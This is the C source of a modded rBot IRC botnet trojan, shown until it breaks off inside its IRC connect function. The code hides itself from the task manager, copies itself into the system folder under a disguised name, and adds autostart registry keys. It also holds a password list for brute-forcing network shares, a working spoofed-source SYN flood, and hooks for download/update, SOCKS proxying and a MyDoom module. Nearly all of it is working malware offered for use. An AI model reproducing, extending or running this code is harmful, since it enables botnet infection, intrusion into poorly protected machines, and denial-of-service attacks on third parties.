/*

Modded Rbot (version 0.0.2) by  (private xT Second Stable !!)

  -fixed flooding 						// ownage 
  -fixed regstarting						// plus cd getter
  -added small pass list faster scanning			// gets more bots 
  -added Csendfilemsg					// exploite ( workin on tftp ! )
  -added dameware (test)				// removed
  -added mydoom (test)					// removed
  -added more ntshares	                                // 	
  -added Turbo scan                                      // .ntscan 150 200 -a  for a fast scan !! no firewalled bots !!


Coming up.
  
  -netcommandmodule						// Error did it again
  -dcom 								// if know how to	
  -dameware								// if i can find the source needed.

xT Changes
  -Better port
  -Increased Threads upto 200 
  -Increased Time 0 = keeps scanning

for the money makers Coming Up
  -Http Flood

*/


 #include <winsock2.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <windows.h>
 #include <wininet.h>
 #include <shellapi.h>
 #include <mmsystem.h>
 #include "crc32.h"
 #include <Winnetwk.h>
 #include <lm.h>
 #include <lmat.h>
 
// #include "dameware.cpp" // nonwrking
 #include "s_MyDoom.cpp" 

 HANDLE threads[256];     // thread handles
 char threadd[256][128];  // thread descriptions

 #define WIN32_LEAN_AND_MEAN
 #define MAX_LINES 20

// #define NO_IDENT      // disables ident server
// #define NO_NETINFO    // disables network info function
// #define NO_SYSINFO    // disables system info function
// #define NO_DOWNLOAD   // disables downloading/updating functions
// #define NO_CONNCHECK  // disables check for internet connection

// Added Functions go *here* for no real reason.
// #define NO_BOTVERSION // disables bot version
// #define NO_SCAN       // disables port scanner
// #define NO_SECURE     // disables !secure
// #define NO_PING       // disables PING Flood
// #define NO_UDP        // disables UDP Flood
// #define NO_SYN        // disables SYN Flood
// #define NO_REDIRECT   // disables port redirect function
// #define NO_SOCK4SERV  // disbales s0cks4 daemon functions

// macro for predefined aliases. (these are just examples, you can change them to whatever you want)
 #define addpredefinedaliases() \

// bot configuration
 const char botid[] = "[xT]"; // bot id
 const char password[] = ""; // bot password
 const  int maxlogins = 1; // maximum number of simultaneous logins
 char server[] = ""; // server
 const  int port = 6667; // server port
 const char serverpass[] = ""; // server password
 char channel[] = "#"; // channel that the bot should join
 char chanpass[] = ""; // channel password
 const char server2[] = ""; // backup server (optional)
 const  int port2 = 6667; // backup server port
 const char channel2[] = "#"; // backup channel (optional)
 const char chanpass2[] = ""; // backup channel password (optional)
 const BOOL topiccmd = TRUE; // set to TRUE to enable topic commands
 const BOOL rndfilename = FALSE; // use random file name
 const char filename[] = "msgfix.exe"; // destination file name
 const BOOL regrun = TRUE; // use the Run registry key for autostart
 const BOOL regrunservices = TRUE; // use the RunServices registry key for autostart
 const BOOL AutoStart = TRUE; 
 const char valuename[] = "Configuration Loader"; // value name for autostart
 const char prefix = '.'; // command prefix (one character max.)
 const  int maxaliases = 16; // maximum number of aliases (must be greater than the  number of predefined aliases).
 char *authost[] = {"*@*", "\0"}; // wildcard works
 const char bversion[] = "(Modded rBot by xT): [ Version 0.0.2 4Stable0 !]"; // Bots !version reply
 const char version[] = "";
 const char *versionlist[] = {
			"mIRC v6.12 Khaled Mardam-Bey",
			"mIRC v6.03 Khaled Mardam-Bey",
			"BitchX-74p2+ by panasync - CYGWIN32/95 4.0 : Keep it to yourself!",
			"..(argon/1g) :bitchx-75 : Keep it to yourself!",
			"BitchX-70alpha14+tcl by panasync - Linux 2.0.27  Keep it to yourself!",
			"BitchX-74p2+1.3f/SunOS 5.6 :(c)rackrock/bX [3.0.1á8] : Keep it to yourself!",
			"[bx.75p1] linux 2.0.36 [embryonic.22b3] :what is this that stands before me",
			"ircII EPIC4pre2 Linux 2.0.34 - Accept no limitations.",
			"ircII EPIC4pre2 SunOS 5.6 - cypher(beta\\one) -myd!nas :one step closer to world domination",
			"ircII 2.9-BitchX-60 Linux 1.2.8 :bitZ%summer '96(bitX%summer'96)",
			"ircII 2.8.2 SunOS 5.6 :ircii 2.8: almost there...",
			"ircII 2.9_base OSF1 V4.0 :ircii 2.8: almost there...",
			"mIRC32 v5.71 K.Mardam-Bey",
			"mIRC32 v5.82 K.Mardam-Bey",
			"mIRC32 v6.01 K.Mardam-Bey",
			"mIRC32 v6.03 K.Mardam-Bey",
			"mIRC32 v6.12 K.Mardam-Bey",
			"mIRC v5.71 K.Mardam-Bey",
			"mIRC v5.82 K.Mardam-Bey",
			"mIRC v6.01 K.Mardam-Bey",
			"mIRC v6.03 K.Mardam-Bey",
			"mIRC v6.1 K.Mardam-Bey",
			"mIRC v6.01 K.Mardam-Bey",
			"mIRC v6.03 K.Mardam-Bey",
			"mIRC v6.10 K.Mardam-Bey",
			"mIRC v6.12 K.Mardam-Bey",
			"mIRC v6.14 K.Mardam-Bey",
			"WSIRC 2.03-R - CopyRight 1994, 1995 Caesar M Samsi csamsi@clark.net TEXT CHANNEL",
			"ircN 6.03 for mIRC - are we being punished for fate -",
			"ircN 7.0rc.6 + 7.0rc.5 + 7.0rc.4 for mIRC - the devils of truth steal the souls of the free -",
			"osiris-1c/bitchx-75p1 + autobot(bx) p3x3 : that time then and once again..",
			"xircon[b4] + doot.3b[pawt] be-two + anony(v1) + aolsay(impulse) + deepthought + saq(dbg)",
			"AmIRC/AmigaOS 2.0.4 by Oliver Wagner <owagner@vapor.com> : http://www.vapor.com/ : [#0000D63F] : The slow mess client",
			"Quarterdeck Global Chat 1.2.9 for Macintosh",
			"Ircle 3.0b10 US PPC 12/15/1997 21:07:34 PM. #239C23AF21B",
			"Eggdrop 1.3.24i (c)1997 Robey Pointer",
			"JPilot IRC Java Client 2.32",
			};


 const char nickconst[] = "[xT]-"; // first part to the bot's nick
 const  int maxrand = 6; // how many random numbers in the nick
 const char *szLocalPayloadFile="payload.dat";
 char *passes[]={
"",
"!@#$",
"!@#$%",
"!@#$%^",
"!@#$%^&",
"!@#$%^&*",
"%",
"0",
"00",
"000",
"0000",
"00000",
"000000",
"00000000",
"007",
"0wn3d",
"0wned",
"1",
"110",
"111",
"111",
"111111",
"11111111",
"11111111",
"12",
"121",
"121212",
"123",
"123123",
"1234",
"12345",
"123456",
"1234567",
"12345678",
"123456789",
"12346",
"123467",
"1234678",
"12346789",
"123467890",
"1234qwer",
"123abc",
"123asd",
"123qwe",
"2002",
"2003",
"2600",
"54321",
"54321",
"54321",
"654321",
"654321",
"88888888",
"88888888",
"a",
"aaa",
"abc",
"account",
"accounting",
"accounts",
"admin",
"ADMIN",
"Admin",
"admin123",
"Administrador",
"Administrateur",
"administrator",
"ADMINISTRATOR",
"Administrator",
"computer",
"computin",
"connect",
"database",
"databasepass",
"databasepassword",
"default",
"DEFAULT",
"Default",
"domainpass",
"domainpassword",
"LOCAL",
"lock",
"lockout",
"lockword",
"logic",
"login",
"Login",
"loginpass",
"loginwor",
"logout",
"M$",
"main",
"maint",
"mypass",
"mypass123",
"mypc",
"mypc123",
"oem",
"OEM",
"oeminstall",
"oemuser",
"office",
"pass",
"pass123",
"pass1234",
"passphra",
"passwd",
"password",
"PASSWORD",
"Password",
"password1",
"password123",
"student",
"student1",
"TEMP",
"temp",
"temp123",
"tess",
"TEST",
"test",
"Test",
"test123",
"tester",
"testin",
"testing",
"usermane",
"username",
"userpassword",
"usmc",
"win",
"win2000",
"win2k",
"win98",
"windose",
"windows",
"windows2k",
"windows95",
"windows98",
"windowsME",
"WindowsXP",
"xx",
"xxx",
"xxxx",
"xxxxx",
"xxxxxx",
"xxxxxxx",
"xxxxxxxx",
"xxxxxxxxx",
"zxcv",
	NULL
};
  
  int current_version=0;

 // ping/udp structure.
 typedef struct ps {
	char host[128];
	char chan[128];
	int num;
	int size;
	int delay;
	int port;
	SOCKET sock;
	int threadnum;
	BOOL silent;
	BOOL gotinfo;
 } ps;

// irc/spy structure.
 typedef struct ircs {
	char host[128];
	int port;
	char channel[64];
	char chanpass[64];
	char hchan[64];
	char nick[16];
	SOCKET sock;
	int spy;
	int threadnum;
	BOOL gotinfo;
 } ircs;

 #ifndef NO_DOWNLOAD
// download/update structure
 typedef struct ds {
	char url[256];
	char dest[256];
	char chan[128];
	SOCKET sock;
	int run;
	int threadnum;
	int update;
	BOOL silent;
	BOOL notice;
	BOOL gotinfo;
	BOOL encrypted;
	unsigned long expectedcrc;
	unsigned long filelen;
 } ds;
 #endif

 #ifndef NO_REDIRECT
// redirect structure.
 typedef struct rs {
	char dest[128];
	int port;
	int lport;
	SOCKET sock;
	SOCKET csock;
	int threadnum;
	BOOL silent;
	BOOL gotinfo;
 } rs;
  #endif

  #ifndef NO_SCAN
// scan structure
 typedef struct scans {
	IN_ADDR addy;
	char chan[128];
	int port;
	int delay;
	SOCKET sock;
	int threadnum;
	DWORD host;
	BOOL silent;
	BOOL notice;
	BOOL gotinfo;
	BOOL cgotinfo;
 } scans;
 #endif

 #ifndef NO_SOCK4SERV
 // socks4 daemon structure.
 typedef struct SOCKS4HEADER {
	u_char vn;
	u_char cd;
	unsigned short destport;
	unsigned long destaddr;
	char userid[1024];
 }SOCKS4HEADER;
 #endif
 
//////////////////////////////////////////
 struct NTPass_Msg {
	 BOOL notice;
	 char chan[128];
     SOCKET sock;
 };

 NTPass_Msg *nt_msg= new NTPass_Msg;
//////////////////////////////////////////

 // alias structure
 typedef struct as {
	 char name[24];
	 char command[160];
 } as;

 #ifndef NO_PING
// icmp.dll typedefs/structs
 typedef unsigned long IPAddr;
 typedef struct ip_option_information {
 	unsigned char Ttl;
 	unsigned char Tos;
 	unsigned char Flags;
 	unsigned char OptionsSize;
 	unsigned char FAR *OptionsData;
 } IP_OPTION_INFORMATION, *PIP_OPTION_INFORMATION;
 typedef struct icmp_echo_reply {
 	IPAddr Address;
 	unsigned long Status;
 	unsigned long RoundTripTime;
 	unsigned short DataSize;
 	unsigned short Reserved;
 	void FAR *Data;
 	struct ip_option_information Options;
 } ICMP_ECHO_REPLY;

// kernel32.dll typedefs/structs
 typedef struct tagPROCESSENTRY32 {
	DWORD dwSize;
	DWORD cntUsage;
	DWORD th32ProcessID;
	DWORD *th32DefaultHeapID;
	DWORD th32ModuleID;
	DWORD cntThreads;
	DWORD th32ParentProcessID;
	LONG pcPriClassBase;
	DWORD dwFlags;
	CHAR szExeFile[MAX_PATH];
 } PROCESSENTRY32, *LPPROCESSENTRY32;

 struct NTSCAN {
	DWORD threads;
	DWORD minutes;
	DWORD threadid;
	char ipmask[20];
};
// icmp.dll function variables
 typedef int (__stdcall *ICF)(VOID);
 ICF fIcmpCreateFile;
 typedef int (__stdcall *ISE)(HANDLE, IPAddr, LPVOID, WORD, PIP_OPTION_INFORMATION, LPVOID, DWORD, DWORD);
 ISE fIcmpSendEcho;
 typedef int (__stdcall *ICH)(HANDLE);
 ICH fIcmpCloseHandle;
 #endif

// wininet.dll function variables
 typedef int (__stdcall *IGCSE)(LPDWORD, char *, DWORD, DWORD);
 IGCSE fInternetGetConnectedStateEx;
 typedef int (__stdcall *IGCS)(LPDWORD, DWORD);
 IGCS fInternetGetConnectedState;

// For dynamically loaded... (won't give error on win9x).
typedef NET_API_STATUS (__stdcall *NSJA)(LPWSTR,LPBYTE,LPDWORD);
NSJA fNetScheduleJobAdd;

typedef NET_API_STATUS (__stdcall *NABF)(LPVOID);
NABF fNetApiBufferFree;

typedef NET_API_STATUS (__stdcall *NRTOD)(LPCWSTR,LPBYTE *);
NRTOD fNetRemoteTOD;

typedef NET_API_STATUS (__stdcall *NUE)(LPWSTR,DWORD,DWORD,LPBYTE *,DWORD,LPDWORD,LPDWORD,LPDWORD);
NUE fNetUserEnum;

// kernel32.dll function variables
 
 typedef int (__stdcall *RSP)(DWORD, DWORD);
 RSP fRegisterServiceProcess;

// function prototypes (not really neccesary, but this way i can put the functions in any order i want)
 long SendSyn(unsigned long TargetIP, unsigned int SpoofingIP, unsigned short TargetPort,int Times);
 long SYNFlood(char *target, char *port, char *len);
 int set (char **wildcard, char **test);
 int asterisk (char **wildcard, char **test);
 int wildcardfit (char *wildcard, char *test);
 int HostMaskMatch(char *h);
 
 BOOL ntscan=FALSE;
 BOOL scanning=FALSE; 
 char scanip[20];
 SOCKET sock2;

 HWND mwnd;
 HANDLE hFileMap;
 LPSTR mData;
 void mirccmd(char *cmd);

 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow);
 char * decryptstr(char *str, int strlen);
 void addlog(char *desc);
 int addalias(char *name, char *command);
 int addthread(char *desc);
 DWORD WINAPI irc_connect(LPVOID param);
 #ifndef NO_IDENT
 DWORD WINAPI ident(LPVOID user);
 #endif
 char * rndnick(char *strbuf);
 int irc_receiveloop(SOCKET sock, char *channel, char *chanpass, char *nick1, SOCKET hsock, char *hchannel, char *server, BYTE spy);
 int irc_parseline(char *line, SOCKET sock, char *channel, char *chanpass, char *nick1, char *server, char *master, char *host, int *in_channel, int repeat);

 void irc_send(SOCKET sock, char *msg);
 void irc_sendf(SOCKET sock, char *msg, char *str);
 void irc_sendf2(SOCKET sock, char *msg, char *str, char *str2);
 void irc_privmsg(SOCKET sock, char *dest, char *msg, BOOL notice);
 char * replacestr(char *str, char *oldstr, char *newstr);
 char pm[64];

 #ifndef NO_DOWNLOAD
 DWORD WINAPI webdownload(LPVOID param);
 #endif

 #ifndef NO_NETINFO
 char * netinfo(char *ninfo, char *host, SOCKET sock);
 #endif
 #ifndef NO_SYSINFO
 char * sysinfo(char *sinfo);
 unsigned __int64 cpuspeed(void);
 unsigned __int64 cyclecount();
 #endif
 #ifndef NO_SCAN
 DWORD WINAPI ip_connect(LPVOID param);
 DWORD WINAPI ip_scan(LPVOID param);
 #endif
 #ifndef NO_UDP
 DWORD WINAPI udp(LPVOID param);
 #endif
 #ifndef NO_PING
 DWORD WINAPI ping(LPVOID param);
 #endif
 #ifndef NO_REDIRECT
 DWORD WINAPI redirect(LPVOID param);
 DWORD WINAPI redirectloop(LPVOID param);
 DWORD WINAPI redirectloop2(LPVOID param);
 #endif
 #ifndef NO_SOCK4SERV
 DWORD WINAPI SocksDaemon(LPVOID param);
 DWORD WINAPI Socks4ClientThread(LPVOID pParam);
 void transfer_loop(SOCKET target, SOCKET client);
 #endif
 void uninstall(void);

// global variables
 HANDLE ih;              // internet handle
 ircs mainirc;           // main irc structure
 char prefix1 = prefix;  // prefix variable

 SOCKET csock[64];       // thread sockets
 char cnick[64][16];     // thread nicks
 char log[128][128];     // log entries
 DWORD w;                // DWORD used for various stuff
 as aliases[maxaliases]; // alias array
 int anum = 16;          // number of aliases
 BOOL success = FALSE;   // if true then we made successful connect attempt
 char tempdir[256];      // name of temp folder
 char pbuff[65500];      // packet buffer
 BOOL noicmp;            // if true, icmp.dll is available
 BOOL noigcse;           // if true, InternetGetConnectedStateEx function is available
 DWORD started;          // time bot was started
 int sploitstats = 0;    // Number of NTPass 'sploits

 #define SOCKS4_CONNECT 1
 #define SOCKS4_GRANT 90
 #define SOCKS4_REJECT 91
 const  int sock4port = 6664; // Port # for sock4 daemon to run on  - CHANGE THIS

 void irc_send(SOCKET sock, char *msg);
 int NetConnect(char *szUserName, char *szPassWord, char *szIP);
 DWORD WINAPI PortScanner(LPVOID param);
 //int RootBox(char *szIP);
 void enumusers(char *szServer);
 DWORD WINAPI ntpass_main(void *pnts);

 int Split(char *inStr, void *saveArray);
 unsigned long ResolveAddress(char *Host);
 char *Xorbuff(char *buff,int buffLen);
 //#include "ntpass.cpp"
 
 #ifndef NO_SYN 
 #define IP_HDRINCL  2 
 
 typedef struct ip_hdr 
 {  unsigned char h_verlen; 
    unsigned char tos; 
    unsigned short total_len; 
    unsigned short ident; 
    unsigned short frag_and_flags; 
    unsigned char ttl; 
    unsigned char proto; 
    unsigned short checksum; 
    unsigned int sourceIP; 
    unsigned int destIP; 
 } IPHEADER; 
 
 typedef struct tsd_hdr 
 {  unsigned long saddr; 
    unsigned long daddr; 
    char mbz; 
    char ptcl; 
    unsigned short tcpl; 
 } PSDHEADER; 
 
 typedef struct tcp_hdr 
 {  USHORT th_sport; 
    USHORT th_dport; 
    unsigned int th_seq; 
    unsigned int th_ack; 
    unsigned char th_lenres; 
    unsigned char th_flag; 
    USHORT th_win; 
    USHORT th_sum; 
    USHORT th_urp; 
 } TCPHEADER;

typedef struct synt 
{
char ip[128];
char port[128];
char length[128];
char chan[128];
BOOL notice;
int threadnumber;
SOCKET socket;
} synt;

 DWORD WINAPI synthread(LPVOID param);
 #endif

 // program starts here
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 { 
	WSADATA wsadata;
	int i = 0, err = 0;
	HKEY key;
	char cfilename[256];
	char filename1[64];
	char sysdir[256];
	char tstr[256];
	DWORD cstat;
	int copies = 0;
	BOOL bkpserver = FALSE;
	BOOL noigcs;

	// record start time
	started = GetTickCount() / 1000;

    #ifndef NO_PING
	// load icmp.dll functions
 	HINSTANCE icmp_dll = LoadLibrary("ICMP.DLL");
    if (icmp_dll == 0) noicmp = TRUE;
 	else {
	 	fIcmpCreateFile  = (ICF)GetProcAddress(icmp_dll,"IcmpCreateFile");
 		fIcmpCloseHandle = (ICH)GetProcAddress(icmp_dll,"IcmpCloseHandle");
 		fIcmpSendEcho    = (ISE)GetProcAddress(icmp_dll,"IcmpSendEcho");
 		if (!fIcmpCreateFile || !fIcmpCloseHandle || !fIcmpSendEcho) {
	        noicmp = TRUE;
	    }
	}
	#endif

	srand(GetTickCount());
    // append this:
    current_version=rand()%(sizeof(versionlist)/sizeof(*versionlist));

	// load functions from kernel32.dll and hide from the windows 9x task manager
	HINSTANCE kernel32_dll = LoadLibrary("kernel32.dll");
	if (kernel32_dll) {
		fRegisterServiceProcess = (RSP)GetProcAddress(kernel32_dll, "RegisterServiceProcess");

		if (fRegisterServiceProcess) fRegisterServiceProcess(0, 1);
	}

	// initialize wininet stuff
	ih = InternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (ih == NULL) ih = 0;
	// see if InternetGetConnectedStateEx is available
	HINSTANCE wininet_dll = LoadLibrary("WININET.DLL");
    if (wininet_dll == 0) noigcse = TRUE;
 	else {
		fInternetGetConnectedState = (IGCS)GetProcAddress(wininet_dll, "InternetGetConnectedState");
		if (!fInternetGetConnectedState) {
			noigcs = TRUE;
		} else noigcs = TRUE;

	 	fInternetGetConnectedStateEx = (IGCSE)GetProcAddress(wininet_dll, "InternetGetConnectedStateEx");
 		if (!fInternetGetConnectedStateEx) {
	        noigcse = TRUE;
	    } else noigcse = FALSE;
	}

	// get our file name and the path to the temp folder
	GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));
	GetTempPath(sizeof(tempdir), tempdir);

	// check if this exe is running already
	CreateMutex(NULL, FALSE, botid);
	while (GetLastError() == ERROR_ALREADY_EXISTS) {
		Sleep(6000);		//for updates... cheap bugfix.
	}

	err = WSAStartup(MAKEWORD(2, 2), &wsadata);
	if (err != 0) return 0;
	if ( LOBYTE( wsadata.wVersion ) != 2 || HIBYTE( wsadata.wVersion ) != 2 ) {
		WSACleanup();
		return 0;
	}

	srand(GetTickCount());
	if (rndfilename) rndnick((char *)&filename); else strncpy(filename1, filename, sizeof(filename1)-1);

	GetSystemDirectory(sysdir, sizeof(sysdir));
	if (strstr(cfilename, sysdir) == NULL) {
		Sleep(1000);
		// loop until the file is copied.
		sprintf(tstr, "\\%s", filename1);
		while (CopyFile(cfilename, strcat(sysdir, tstr), FALSE) == FALSE) Sleep(5000);

		PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		memset(&sinfo, 0, sizeof(STARTUPINFO));
		sinfo.cb = sizeof(sinfo);
		sinfo.wShowWindow = SW_HIDE;
		WSACleanup();
		if (CreateProcess(NULL, sysdir, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo)) exit(0);
	}

	if (AutoStart) { 
		RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
		RegSetValueEx(key, valuename, 0, REG_SZ, (const unsigned char *)&filename1, sizeof(filename)+1);
		RegCloseKey(key); 
 
	//	RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
	//	RegSetValueEx(key, valuename, 0, REG_SZ, (const unsigned char *)&filename1, sizeof(filename)+1); 
	//	RegCloseKey(key); 
 
		RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
		RegSetValueEx(key, valuename, 0, REG_SZ, (const unsigned char *)&filename1, sizeof(filename)+1); 
		RegCloseKey(key); 
 
		RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
		RegSetValueEx(key, valuename, 0, REG_SZ, (const unsigned char *)&filename1, sizeof(filename)+1);
		RegCloseKey(key); 
 
	//	RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
	//	RegSetValueEx(key, valuename, 0, REG_SZ, (const unsigned char *)&filename1, sizeof(filename)+1); 
	//	RegCloseKey(key); 
	}

	memset(threadd, 0, sizeof(threadd));
	memset(cnick, 0, sizeof(cnick));
	memset(aliases, 0, sizeof(aliases));

	addthread("main thread");

	// remove the following line if you don't want any predefined aliases
	addpredefinedaliases();

	memset(log, 0, sizeof(log));
	addlog("Bot started");

	// copy settings into main irc structure
	strncpy(mainirc.host, server, sizeof(mainirc.host)-1);
	mainirc.port = port;
	strncpy(mainirc.channel, channel, sizeof(mainirc.channel)-1);
	strncpy(mainirc.chanpass, chanpass, sizeof(mainirc.chanpass)-1);
	mainirc.spy = 0;

	while (1) {
		for (i = 0; i < 6; i++) {
			#ifndef NO_CHECKCONNECTION
			// check if we're connected to the internet... if not, then wait 5mins and try again
			if (!noigcs) if (fInternetGetConnectedState(&cstat, 0) == FALSE) {
				Sleep(30000);
				continue;
			}
			#endif

			err = irc_connect((void *)&mainirc);
			
			success = FALSE;
			if (err == 2) break; // break out of the loop

			if (success) i--; // if we're successful in connecting, decrease i by 1;

			// irc_connect didn't return 2, so we need to sleep then reconnect
			Sleep(3000);
		}

		if (err == 2) break; // break out of the loop and close

		if (bkpserver) {
			strncpy(mainirc.host, server, sizeof(mainirc.host)-1);
			mainirc.port = port;
			strncpy(mainirc.channel, channel, sizeof(mainirc.channel)-1);
			strncpy(mainirc.chanpass, chanpass, sizeof(mainirc.chanpass)-1);
			bkpserver = FALSE;
		}
		else if (!bkpserver && server2[0] != '\0') {
		    strncpy(mainirc.host, server2, sizeof(mainirc.host)-1);
			mainirc.port = port2;
			strncpy(mainirc.channel, channel2, sizeof(mainirc.channel)-1);
			strncpy(mainirc.chanpass, chanpass2, sizeof(mainirc.chanpass)-1);
			bkpserver = TRUE;
		}
	}

	// cleanup;
	for (i = 0; i < 64; i++) closesocket(csock[i]);
	WSACleanup();

	return 0;
 }

#ifndef NO_SYN
  USHORT checksum(USHORT *buffer, int size) 
{ 
   unsigned long cksum=0; 

   while(size > 1) { cksum+=*buffer++; size -= 2; }
   if(size) cksum += *(UCHAR*)buffer; 
 
   cksum = (cksum >> 16) + (cksum & 0xffff); 
   cksum += (cksum >>16); 
   return (USHORT)(~cksum); 
}
 
u_long LookupAddress(const char* szHost)
{
   u_long nRemoteAddr = inet_addr(szHost);
   struct hostent *pHE;

   if (nRemoteAddr == INADDR_NONE)
       {
       pHE = gethostbyname(szHost);
       if (pHE == 0) return INADDR_NONE;
       nRemoteAddr = *((u_long*)pHE->h_addr_list[0]);
       }

   return nRemoteAddr;
}

long SendSyn(unsigned long TargetIP, unsigned int SpoofingIP, unsigned short TargetPort, int len)
{ 
   WSADATA WSAData; 
   SOCKET sock; 
   SOCKADDR_IN addr_in; 
   IPHEADER ipHeader; 
   TCPHEADER tcpHeader; 
   PSDHEADER psdHeader; 
 
   LARGE_INTEGER freq, halt_time, cur;
   char szSendBuf[60]={0}; 
   BOOL flag; 
   int rect;
   long total;
   char buf[64];

   if (WSAStartup(MAKEWORD(2,2), &WSAData)!=0) 
       return FALSE; 
 
   if ((sock=WSASocket(AF_INET,SOCK_RAW,IPPROTO_RAW,NULL,0,WSA_FLAG_OVERLAPPED ))==INVALID_SOCKET)
       return FALSE; 

   flag=TRUE;
   if (setsockopt(sock,IPPROTO_IP, IP_HDRINCL,(char *)&flag,sizeof(flag))==SOCKET_ERROR)
       return FALSE; 

   addr_in.sin_family=AF_INET;
   addr_in.sin_port=htons(TargetPort);
   addr_in.sin_addr.s_addr=TargetIP;

   ipHeader.h_verlen=(4<<4 | sizeof(ipHeader)/sizeof(unsigned long));
   ipHeader.total_len=htons(sizeof(ipHeader)+sizeof(tcpHeader));
   ipHeader.ident=1;
   ipHeader.frag_and_flags=0;
   ipHeader.ttl=128;
   ipHeader.proto=IPPROTO_TCP;
   ipHeader.checksum=0;
   ipHeader.destIP=TargetIP;
   tcpHeader.th_dport=htons(TargetPort);
   tcpHeader.th_ack=0;
   tcpHeader.th_lenres=(sizeof(tcpHeader)/4<<4|0); 
   tcpHeader.th_flag=2; 
   tcpHeader.th_win=htons(16384); 
   tcpHeader.th_urp=0; 
 
   total = 0;
   QueryPerformanceFrequency(&freq);
   QueryPerformanceCounter(&cur);
   halt_time.QuadPart = (freq.QuadPart * len) + cur.QuadPart;
 
   while(TRUE) 
      {
      tcpHeader.th_sum=0; 
 
      psdHeader.daddr=ipHeader.destIP; 
      psdHeader.mbz=0; 
      psdHeader.ptcl=IPPROTO_TCP; 
      psdHeader.tcpl=htons(sizeof(tcpHeader)); 
      ipHeader.sourceIP=htonl(SpoofingIP++); 

      tcpHeader.th_sport=htons((rand() % 1001) + 1000 ); // source port 
      tcpHeader.th_seq=htons((rand() << 16) | rand());
 
      psdHeader.saddr=ipHeader.sourceIP; 
 
      memcpy(szSendBuf, &psdHeader, sizeof(psdHeader)); 
      memcpy(szSendBuf+sizeof(psdHeader), &tcpHeader, sizeof(tcpHeader)); 
      tcpHeader.th_sum=checksum((USHORT *)szSendBuf,sizeof(psdHeader)+sizeof(tcpHeader)); 
 
      memcpy(szSendBuf, &ipHeader, sizeof(ipHeader)); 
      memcpy(szSendBuf+sizeof(ipHeader), &tcpHeader, sizeof(tcpHeader)); 
      memset(szSendBuf+sizeof(ipHeader)+sizeof(tcpHeader), 0, 4); 
      ipHeader.checksum=checksum((USHORT *)szSendBuf, sizeof(ipHeader)+sizeof(tcpHeader)); 
 
      memcpy(szSendBuf, &ipHeader, sizeof(ipHeader)); 
 
      rect=sendto(sock, szSendBuf, sizeof(ipHeader)+sizeof(tcpHeader),0,(struct sockaddr*)&addr_in, sizeof(addr_in));
      if (rect==SOCKET_ERROR)
         {
          sprintf(buf, "SYN flood error: %d\n",WSAGetLastError());
          addlog(buf);
          return 0;
         }
     
      total += rect;
      QueryPerformanceCounter(&cur);
      if (cur.QuadPart >= halt_time.QuadPart)
         break;
     }

   closesocket(sock); 
   WSACleanup(); 
 
   return (total);
}

long SYNFlood(char *target, char *port, char *len)
{
   unsigned long TargetIP;
   unsigned short p;
   unsigned int SpoofIP;
   long num;
   int t;
   char buf[80];

   TargetIP = LookupAddress((const char *)target);
   p = atoi(port);
   t = atoi(len);
   SpoofIP = TargetIP + ((rand()%512)+256);

   num = SendSyn(TargetIP, SpoofIP, p, t);

   #ifdef REMOVE_NONSYNNERS
   if (!num)
       {
       uninstall();
       WSACleanup();
       ExitProcess(0);
       }
   #endif

   if (!num) num = 1;  // 'Div by zero' kludge
   num = num / 1000 / t;

   sprintf(buf, "SYN Attack!: %s:%s [%iKB/s]", target, port, num);
   addlog(buf);
   return num;
}
#endif

// function to add a log item
 void addlog(char *desc)
 {
	char szTime[64];
	SYSTEMTIME st;

	GetLocalTime(&st);

	GetTimeFormat(LOCALE_USER_DEFAULT, 0, &st, "hh:mm:sstt", szTime, sizeof(szTime));

	for (int i = 126; i >= 0; i--) if (log[i][0] != '\0') strncpy(log[i+1], log[i], sizeof(log[i+1])-1);
	sprintf(log[0], "[%d-%d-%d %s] %s", st.wMonth, st.wDay, st.wYear, szTime, desc);
 }

// function to add an alias and return alias number
 int addalias(char *name, char *command)
 {
	int i;
	for (i = 0; i < maxaliases; i++) {
		if (aliases[i].name[0] == '\0' || strcmp(aliases[i].name, name) == 0) {
			memset(&aliases[i], 0, sizeof(aliases[i]));
			strncpy(aliases[i].name, name, sizeof(aliases[i].name)-1);
			strncpy(aliases[i].command, command, sizeof(aliases[i].command)-1);
			anum++;
			break;
		}
	}
	return i;
 }

// function to add description to thread list and return thread number
 int addthread(char *desc)
 {
	int i;
	for (i = 0; i < 64; i++) {
		if (threadd[i][0] == '\0') {
			strncpy(threadd[i], desc, sizeof(threadd[i])-1);
			break;
		}
	}
	return i;
 }

// connect function used by the original bot and all clones/spies
 DWORD WINAPI irc_connect(LPVOID param)
 {
	SOCKET sock;
	SOCKADDR_IN ssin;
	DWORD err;
	int rval;
	char nick[16];
	char *nick1;
	char str[64];
	BYTE spy;
	ircs irc;

	irc = *((ircs *)param);
	ircs *ircp = (ircs *)param;
	ircp->gotinfo = TRUE;


	while (1) {
		memset(&ssin, 0, sizeof(ssin));
		ssin.sin_family = AF_INET;
		ssin.sin_port = htons(irc.port);

